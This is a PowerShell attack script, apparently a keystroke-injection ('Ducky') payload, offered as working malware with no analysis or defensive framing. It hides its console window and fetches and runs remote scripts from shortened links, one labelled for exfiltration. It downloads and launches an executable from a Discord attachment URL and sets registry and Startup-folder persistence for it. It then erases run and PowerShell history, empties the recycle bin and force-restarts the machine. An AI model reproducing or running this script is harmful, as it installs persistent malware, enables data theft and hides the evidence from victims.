Set-ExecutionPolicy unrestricted -Force;
#Hide-Powershell
Add-Type @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

    [DllImport("kernel32.dll", ExactSpelling = true)]
    public static extern IntPtr GetConsoleWindow();
}
"@

$SW_HIDE = 0;
$consolePtr = [User32]::GetConsoleWindow();
[User32]::ShowWindow($consolePtr, $SW_HIDE);

#Disable
irm https://rb.gy/vrt4s6 | iex;

#Ducky-Exfil
irm https://rb.gy/xzpj1d | iex;

#Disto
Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/895907015614930984/1269444822612181054/distopan.exe?ex=66b0161e&is=66aec49e&hm=1e4d002fc89f532ae6b53f298bcacf892700f1e8137fa1f43cafcab59bdd8591&" -OutFile "$env:temp\distopi.exe"; powershell "$env:temp\distopi.exe";

# Función para agregar persistencia mediante el registro de Windows
function Add-RegistryPersistence {
    $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    $name = "DistopiaPersistence"
    $value = "$env:TEMP\distopi.exe"
    
    if (-not (Test-Path $regPath)) {
        New-Item -Path $regPath -Force | Out-Null
    }
    Set-ItemProperty -Path $regPath -Name $name -Value $value
}

# Función para agregar persistencia mediante la carpeta de inicio
function Add-StartupFolderPersistence {
    $startupPath = [System.IO.Path]::Combine($env:APPDATA, "Microsoft\Windows\Start Menu\Programs\Startup\distopi.lnk")
    $shell = New-Object -ComObject WScript.Shell
    $shortcut = $shell.CreateShortcut($startupPath)
    $shortcut.TargetPath = "$env:TEMP\distopi.exe"
    $shortcut.Save()
}

# Llamada a las funciones para agregar persistencia
Add-RegistryPersistence
Add-StartupFolderPersistence

# 1delete run box history
reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f ;

# 1Delete powershell history
Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue;

# 1Empty recycle bin
Clear-RecycleBin -Force -ErrorAction SilentlyContinue;

#Last discord kill before quit
taskkill /IM Discord.exe /F;

# Clear History powershell:
  [Microsoft.PowerShell.PSConsoleReadLine]::ClearHistory();
# Clear run powershell:
  Remove-Item HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU;

Start-Sleep -Seconds 5;
Restart-Computer -Force;

exit;
